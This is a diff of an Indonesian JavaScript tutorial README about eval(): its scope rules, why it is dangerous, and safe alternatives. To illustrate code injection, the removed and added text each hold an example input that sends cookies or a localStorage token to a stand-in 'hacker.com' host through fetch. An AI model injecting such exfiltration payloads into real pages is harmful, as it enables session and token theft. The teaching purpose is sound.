@@ -1,149 +1,221 @@
 # 18 - Eval (Eksekusi Dinamis, Analisis Risiko Keamanan, dan Alternatif Aman)
 
 > ⏱️ **TL;DR (Ringkasan Cepat):**
-> * **Fungsi Utama**: Memahami fungsi bawaan `eval()` sebagai parser dan eksekutor ekspresi string kode JavaScript dinamis.
-> * **Kapan Digunakan**: Memahami mengapa `eval()` **sangat berbahaya dan dijuluki 'eval is evil'** di industri software.
-> * **Aturan Praktis**: Pegang prinsip emas: **'Never use eval()!'**.
+>
+> - **Fungsi Utama**: Mengevaluasi string teks sebagai kode JavaScript dinamis pada saat _runtime_.
+> - **Kapan Digunakan**: Hampir **tidak pernah** dalam kode aplikasi modern komersial; dijuluki _"eval is evil"_ karena membuka celah keamanan kritis (_Code Injection / XSS_) dan mematikan optimasi compiler mesin JavaScript (V8).
+> - **Aturan Praktis**: Pegang teguh prinsip **"Never use eval()!"**; gunakan `JSON.parse()` untuk parsing data, pola _Lookup Table_ untuk kalkulator/perintah, dan `new Function()` hanya jika Anda sedang membangun compiler atau sandbox khusus.
+
+---
 
 ## 1. 🎯 Tujuan Belajar
-- Memahami fungsi bawaan `eval()` sebagai parser dan eksekutor ekspresi string kode JavaScript dinamis.
-- Memahami mengapa `eval()` **sangat berbahaya dan dijuluki 'eval is evil'** di industri software.
-- Menganalisis dampak negatif `eval()` terhadap keamanan (XSS, Code Injection) dan performa (hilangnya optimasi V8/JIT Compiler).
-- Menguasai alternatif modern yang aman: `JSON.parse()`, objek Lookup Table, dan `new Function()` terisolasi.
+
+- Memahami mekanisme internal fungsi bawaan `eval()` dalam mengevaluasi string ekspresi dan _statement_.
+- Mengetahui perbedaan perilaku scope pada **Sloppy Mode** vs **Strict Mode** (`"use strict"`).
+- Membedakan antara **Direct `eval()`** (akses scope lokal) dan **Indirect `eval()`** seperti `(0, eval)()` (akses scope global).
+- Menganalisis alasan fundamental mengapa `eval()` dilarang keras di industri: _Arbitrary Code Execution_, pembongkaran optimasi JIT Compiler (V8), dan kerusakan _mangling_ bundler.
+- Menguasai alternatif modern yang aman: **`JSON.parse()`**, pola **Kamus Operasi (_Lookup Table_)**, dan konstruktor **`new Function()`**.
 
 ---
 
-## 2. 📖 Penjelasan Konsep
+## 2. 📖 Penjelasan Konsep & API Reference
 
 ### 🎭 Analogi Dunia Nyata
-> `eval()` seperti **memberikan kunci brankas master bank dan hak otorisasi penuh kepada sembarang orang asing yang datang lewat loket**: Anda berharap orang tersebut hanya ingin menukar uang koin, namun karena Anda memberinya wewenang mutlak, ia bisa menguras brankas atau membakar kantor bank Anda.
 
-Fungsi **`eval(stringKode)`** adalah fungsi bawaan JavaScript yang mengevaluasi atau mengeksekusi string teks yang diterimanya seolah-olah teks tersebut adalah kode JavaScript asli yang diketik langsung oleh programmer.
-
-### 1. Cara Kerja `eval()`
-```javascript
-const x = 10;
-const y = 20;
-const hasil = eval('x + y * 2'); // Menghasilkan 50
-```
-
-### 2. Mengapa Penggunaan `eval()` Dilarang Keras di Industri?
-1. **Risiko Keamanan Ekstrem (Code Injection & XSS)**:
-   Jika string yang dievaluasi berasal dari input pengguna, hacker dapat menyusupkan skrip jahat (*malicious code*) untuk mencuri token sesi, cookie, atau menguras saldo rekening:
-   `eval(inputDariUser); // Bayangkan jika user memasukkan: 'fetch("https://hacker.com?stolen=" + document.cookie)'`
-2. **Menghancurkan Optimasi Mesin JavaScript (JIT Compiler)**:
-   Mesin JS modern seperti Google V8 mengoptimalkan kode dengan menganalisis scope variabel sebelum kode berjalan. Karena `eval()` bisa mengubah atau menciptakan variabel baru di sembarang scope lokal, V8 terpaksa mematikan seluruh optimasi mesin, membuat kode berjalan jauh lebih lambat.
-3. **Pencemaran Scope & Kesulitan Debugging**:
-   `eval()` dapat memanipulasi variabel di sekitarnya secara tidak terduga dan menghasilkan pesan error yang sangat sulit dilacak nomor barisnya (*stack trace*).
-
-### 3. Alternatif Aman Modern Pengganti `eval()`
-* **Jika butuh mengubah data teks menjadi objek**: Gunakan **`JSON.parse()`** murni.
-* **Jika butuh kalkulasi matematika berdasarkan operator**: Gunakan **Kamus Fungsi (*Lookup Table*)**:
-  ```javascript
-  const kalkulator = {
-    '+': (a, b) => a + b,
-    '-': (a, b) => a - b,
-    '*': (a, b) => a * b
-  };
-  ```
-* **Jika benar-benar terpaksa butuh eksekusi kode dinamis terisolasi**: Gunakan konstruktor **`new Function()`** karena hanya dieksekusi di lingkup global (*tidak dapat mengakses scope lokal di sekitarnya*).
+> `eval()` seperti **memberikan kunci brankas master dan hak otorisasi mutlak kantor pusat kepada sembarang orang asing yang datang lewat loket kasir**: Anda mungkin hanya berharap orang tersebut menukar uang receh, namun karena Anda memberinya otoritas eksekusi tanpa batas, ia bisa mentransfer seluruh saldo brankas bank ke rekening pribadinya, mengubah data nasabah, atau membakar kantor Anda dari dalam.
 
 ---
 
-## 3. 💻 Contoh Kode (`example.js`)
+### 1. Cheat-Sheet Perbandingan Metode Eksekusi Dinamis
+
+| Fitur                            | `eval()` Direct             | `(0, eval)()` Indirect  | `new Function()`           | `JSON.parse()`               |
+| :------------------------------- | :-------------------------- | :---------------------- | :------------------------- | :--------------------------- |
+| **Akses Scope Lokal (Closure)**  | ✅ Penuh (Bisa baca & ubah) | ❌ Tidak (Hanya global) | ❌ Tidak (Hanya global)    | ❌ Tidak ada kode yang jalan |
+| **Scope Variabel Baru (Sloppy)** | Bocor ke fungsi luar        | Bocor ke window/global  | Terisolasi di fungsi       | Hanya mengembalikan nilai    |
+| **Dampak ke Optimasi JIT V8**    | 💥 Sangat Merusak           | 💥 Merusak              | ⚠️ Moderat                 | 🚀 Nol (Sangat Cepat)        |
+| **Risiko Code Injection**        | 🔴 Ekstrem Tinggi           | 🔴 Ekstrem Tinggi       | 🔴 Tinggi                  | 🟢 Bebas Risiko (Aman 100%)  |
+| **Rekomendasi Industri**         | ❌ DILARANG KERAS           | ❌ HINDARI              | ⚠️ Khusus Tooling/Compiler | ✅ **Sangat Dianjurkan**     |
+
+---
+
+### 2. Cara Kerja Dasar `eval()`
+
+`eval(string)` menerima parameter berupa string dan mengeksekusinya di titik pemanggilan. Jika ekspresi menghasilkan nilai, `eval()` mengembalikan nilai evaluasi dari _statement_ terakhir:
+
 ```javascript
-// Penjelasan lengkap materi ini dapat dilihat di README.md
+const a = 10;
+const b = 20;
 
-console.log('--- 1. Cara Kerja Dasar eval() (Hanya untuk Demonstrasi Teori) ---');
-const a = 15;
-const b = 5;
+const hasil = eval("a + b * 2"); // Menghasilkan 50
+console.log(hasil);
+```
 
-// eval mengevaluasi string sebagai kode
-const hasilKalkulasi = eval('a * b + 10');
-console.log("Hasil evaluasi string 'a * b + 10':", hasilKalkulasi);
+---
 
-console.log('\n--- 2. Simulasi Bahaya Keamanan Code Injection ---');
-// Bayangkan input ini berasal dari kolom form input website Anda:
-const inputJahatDariHacker = "a + b; console.warn('[BAHAYA]: Akun Anda berhasil diretas oleh penyerang!');";
+### 3. Pencemaran Scope: Sloppy Mode vs Strict Mode
 
-console.log('Mengeksekusi input pengguna tidak terpercaya:');
-eval(inputJahatDariHacker);
+Pada mode non-strict (_Sloppy Mode_), `eval()` memiliki kemampuan berbahaya untuk menyuntikkan variabel baru langsung ke dalam scope fungsi pemanggilnya:
 
-console.log('\n--- 3. Alternatif Aman: Kamus Operasi (Lookup Table) ---');
-// Alih-alih eval(angka1 + operator + angka2), buat fungsi pemetaan yang aman:
-const operasiAman = {
-  tambah: (x, y) => x + y,
-  kurang: (x, y) => x - y,
-  kali:   (x, y) => x * y,
-  bagi:   (x, y) => y !== 0 ? x / y : 'Error: Pembagian nol'
-};
-
-function hitungAman(x, y, tipeOperasi) {
-  const aksi = operasiAman[tipeOperasi];
-  if (!aksi) {
-    throw new Error(`Operasi '${tipeOperasi}' tidak dikenal dan ditolak!`);
-  }
-  return aksi(x, y);
+```javascript
+// A. Sloppy Mode (Variabel bocor keluar):
+function demoSloppy() {
+  eval("var disusupi = 100;");
+  console.log(disusupi); // 100 (Variabel bocor ke fungsi lokal!)
 }
 
-console.log('Hitung Aman (tambah) :', hitungAman(50, 25, 'tambah'));
-console.log('Hitung Aman (kali)   :', hitungAman(10, 4, 'kali'));
-
-console.log('\n--- 4. Alternatif Aman untuk Parsing Data: JSON.parse ---');
-// JANGAN PERNAH gunakan eval('(' + jsonStr + ')')!
-const jsonStr = '{"status": "sukses", "kode": 200}';
-const dataObj = JSON.parse(jsonStr); // 100% aman dari eksekusi kode jahat
-console.log('Hasil parse JSON aman:', dataObj.status);
+// B. Strict Mode (Variabel terisolasi di dalam eval):
+function demoStrict() {
+  "use strict";
+  eval("var terisolasi = 200;");
+  // console.log(terisolasi); // ❌ ReferenceError: terisolasi is not defined
+}
 ```
 
 ---
 
-## 4. 🖥️ Output yang Diharapkan
-```text
---- 1. Cara Kerja Dasar eval() (Hanya untuk Demonstrasi Teori) ---
-Hasil evaluasi string 'a * b + 10': 85
+### 4. Direct Eval vs Indirect Eval
 
---- 2. Simulasi Bahaya Keamanan Code Injection ---
-Mengeksekusi input pengguna tidak terpercaya:
-[BAHAYA]: Akun Anda berhasil diretas oleh penyerang!
+JavaScript membedakan pemanggilan `eval` menjadi dua kategori berdasarkan cara pemanggilannya:
 
---- 3. Alternatif Aman: Kamus Operasi (Lookup Table) ---
-Hitung Aman (tambah) : 75
-Hitung Aman (kali)   : 40
+1. **Direct `eval()`**: Dipanggil secara langsung dengan nama `eval(...)`.
+   - Mengakses scope leksikal lokal tempat ia dipanggil.
+2. **Indirect `eval()`**: Dipanggil melalui referensi variabel lain atau ekspresi operator koma `(0, eval)(...)`.
+   - Hanya berjalan di **lingkup global** (`globalThis`), tidak dapat mengakses variabel lokal di fungsi sekitarnya:
 
---- 4. Alternatif Aman untuk Parsing Data: JSON.parse ---
-Hasil parse JSON aman: sukses
+```javascript
+globalThis.pesan = "Pesan Global";
+
+function tesScope() {
+  const pesan = "Pesan Lokal";
+
+  console.log(eval("pesan")); // "Pesan Lokal"  (Direct -> akses lokal)
+  console.log((0, eval)("pesan")); // "Pesan Global" (Indirect -> dipaksa global)
+}
 ```
 
 ---
 
-## 5. 💡 Panduan Praktis & Studi Kasus
+### 5. Mengapa "Eval is Evil": Tiga Alasan Kritis
 
+1. **Celah Keamanan Fatal (_Arbitrary Code Injection_)**:
+   Jika string yang dievaluasi berasal dari input form, query parameter, atau payload API, pengguna jahat dapat menyuntikkan script arbitrary:
+   ```javascript
+   // Input jahat dari form:
+   const input =
+     "1; fetch('https://hacker.com/steal?token=' + localStorage.getItem('token'))";
+   eval(input); // ❌ Token pengguna tercuri!
+   ```
+2. **Menghancurkan Optimasi Kompiler (JIT De-optimization)**:
+   Engine modern seperti V8 mengoptimalkan kode dengan menganalisis posisi variabel di memori sebelum kode berjalan. Karena `eval()` berpotensi mengubah atau menyuntikkan variabel baru secara dinamis, V8 terpaksa **mematikan optimasi mesin** pada scope tersebut, membuat performa aplikasi anjlok.
+3. **Macet pada Minifikasi Kode (_Build Bundler_)**:
+   Alat kompresi kode seperti Terser atau esbuild tidak dapat melakukan _variable mangling_ (mengubah nama variabel panjang menjadi 1 huruf) di sekitar `eval()` karena takut merusak string yang dievaluasi.
+
+---
+
+### 6. Alternatif Aman 1: `JSON.parse()` untuk Data
+
+Pada era JavaScript awal (sebelum 2009), programmer sering menggunakan `eval('(' + jsonStr + ')')` untuk membaca objek data JSON. Pola ini sekarang dilarang keras! Selalu gunakan standar bawaan `JSON.parse()`:
+
+```javascript
+const jsonString = '{"user": "joko", "role": "admin"}';
+
+// ❌ BAHAYA: eval('(' + jsonString + ')');
+// ✅ AMAN 100%:
+const data = JSON.parse(jsonString);
+console.log(data.user); // "joko"
+```
+
+---
+
+### 7. Alternatif Aman 2: Kamus Operasi (_Lookup Table_)
+
+Jika tujuan Anda menggunakan `eval()` adalah untuk membuat kalkulator atau mengevaluasi formula matematika dinamis berdasarkan operator:
+
+```javascript
+// Petakan operator ke dalam kamus fungsi aman (Strategy Pattern):
+const kalkulator = {
+  "+": (a, b) => a + b,
+  "-": (a, b) => a - b,
+  "*": (a, b) => a * b,
+  "/": (a, b) => (b !== 0 ? a / b : "Division by zero"),
+};
+
+function hitung(a, b, op) {
+  const aksi = kalkulator[op];
+  if (!aksi) throw new Error(`Operator '${op}' tidak diizinkan!`);
+  return aksi(a, b);
+}
+
+console.log(hitung(10, 5, "*")); // 50 ✅ Aman tanpa celah injeksi kode
+```
+
+---
+
+### 8. Alternatif Aman 3: `new Function()` untuk Kompilasi Dinamis
+
+Jika Anda benar-benar membangun sistem kompilator template (seperti Handlebars atau internal bundler) yang wajib menghasilkan kode fungsi saat runtime:
+
+```javascript
+// new Function() hanya berjalan di lingkup global dan tidak mengikat closure lokal:
+const rumus = new Function("alas", "tinggi", "return 0.5 * alas * tinggi;");
+
+console.log(rumus(10, 8)); // 40
+```
+
+> ⚠️ **Catatan Penting**:
+> Walaupun lebih baik daripada `eval()` karena tidak membocorkan scope lokal, `new Function()` **tetap memicu peringatan Content Security Policy (CSP)** di browser produksi jika kebijakan `unsafe-eval` dinonaktifkan.
+
+---
+
+## 3. 💻 Kode Praktik Terpadu (`example.js`)
+
+Seluruh konsep cara kerja `eval()`, jebakan scope di Sloppy vs Strict mode, perbedaan Direct vs Indirect eval, simulasi eksploitasi Code Injection, serta tiga alternatif implementasi yang aman dirangkum ke dalam satu laboratorium kode siap pakai:
+
+📁 File: [`example.js`](./example.js)
+
+```bash
+# Jalankan langsung dari terminal:
+node 03-standard-library/18-eval/example.js
+```
+
+---
+
+## 4. 💡 Panduan Praktis & Studi Kasus
 
 ### 🏢 Real-World Use Case
-1. **Taman Bermain Kode Online (REPL / Code Playground)**: Tool seperti DevTools Console atau CodePen membutuhkan eksekusi string dinamis (namun selalu dijalankan di lingkungan Sandbox web worker yang sangat terisolasi).
-2. **Mesin Template & Compiler Internal**: Digunakan secara sangat hati-hati oleh tim inti pembuat bundler/transpiler seperti Babel.
-3. **Saran Industri**: 99.9% aplikasi web komersial **sama sekali tidak membutuhkan `eval()`**.
+
+1. **REPL & Online Code Playground (DevTools / CodePen)**:
+   Aplikasi yang memang bertujuan mengeksekusi kode dari pengguna. Namun, di lingkungan produksi nyata, kode tersebut **dijalankan di Web Worker atau sandbox terisolasi tanpa akses ke DOM atau cookie utama**.
+2. **Mesin Template & Parser Formula Spreadsheet**:
+   Sebagian besar library formula spreadsheet modern menggunakan **AST (Abstract Syntax Tree) Parser** murni alih-alih `eval()`.
 
 ### ⚠️ Common Pitfalls (Jebakan Umum)
-- **Membuka Celah XSS Mematikan**: Memasukkan parameter URL atau data form ke `eval()` adalah tiket ekspres terjadinya serangan peretasan data pengguna.
-- **Menghancurkan Kecepatan Aplikasi**: V8 engine tidak bisa mengoptimalkan variabel di sekitar `eval()` sehingga seluruh fungsi tempat `eval` berada akan mengalami degradasi kecepatan yang signifikan.
-- **Diblokir oleh Content Security Policy (CSP)**: Website modern di produksi mengaktifkan CSP yang otomatis memblokir eksekusi `eval()` demi keamanan server.
+
+- **Mengevaluasi Parameter URL atau Form Pengguna**:
+  Kesalahan paling fatal yang menyebabkan kerentanan keamanan XSS tingkat tinggi.
+- **Menggunakan `eval` untuk Membaca Properti Dinamis**:
+  Pemula sering menulis `eval('obj.' + prop)`. Padahal JavaScript sudah menyediakan notasi kurung siku yang aman: `obj[prop]`.
+- **Aplikasi Crash di Lingkungan CSP Ketat**:
+  Aplikasi enterprise yang mematuhi standar OWASP memblokir `'unsafe-eval'` pada header HTTP CSP. Kode yang memuat `eval()` akan langsung dilempar error oleh browser.
 
 ### 🌟 Best Practice
-- Pegang prinsip emas: **'Never use eval()!'**.
-- Gunakan `JSON.parse()` murni saat ingin membaca struktur data dari string teks.
-- Gunakan Lookup Table objek pemetaan fungsi untuk kalkulator atau pengeksekusi perintah berbasis teks.
+
+- **Pegang aturan utama**: 99.9% kebutuhan pemrograman aplikasi web modern tidak memerlukan `eval()`.
+- Gunakan `JSON.parse()` untuk membaca format data teks.
+- Gunakan _Lookup Table / Strategy Pattern_ untuk kalkulator dan pemrosesan instruksi pengguna.
+- Gunakan parser berbasis AST (_Abstract Syntax Tree_) jika membutuhkan kalkulasi ekspresi matematika yang kompleks.
 
 ---
 
-## 6. ✍️ Latihan Mandiri
-1. Buatlah fungsi `kalkulatorStringAman(angka1, operator, angka2)` yang mendukung operator `+`, `-`, `*`, dan `/` menggunakan teknik *Lookup Table* tanpa menggunakan `eval()`.
-2. Jelaskan secara tertulis mengapa kode `JSON.parse('{"x": 10}')` jauh lebih aman dibandingkan dengan `eval('({"x": 10})')`.
+## 5. ✍️ Latihan Mandiri
+
+1. Buatlah fungsi `kalkulatorStringAman(angka1, operator, angka2)` yang mendukung operator `+`, `-`, `*`, `/`, dan `**` menggunakan teknik _Lookup Table_ tanpa menggunakan `eval()`.
+2. Jelaskan mengapa kode `JSON.parse('{"status": "ok"}')` 100% aman dari eksekusi kode berbahaya sedangkan `eval('({"status": "ok"})')` berisiko tinggi.
 
 ---
 
-## 7. 🧭 Navigasi
+## 6. 🧭 Navigasi
+
 - ⬅️ **Sebelumnya:** [17 - Base64](../17-base64/README.md)
 - 🏠 **Daftar Isi Modul 03:** [README Modul 03](../README.md)
 - 📑 **Daftar Isi Utama:** [Kembali ke Root README](../../README.md)
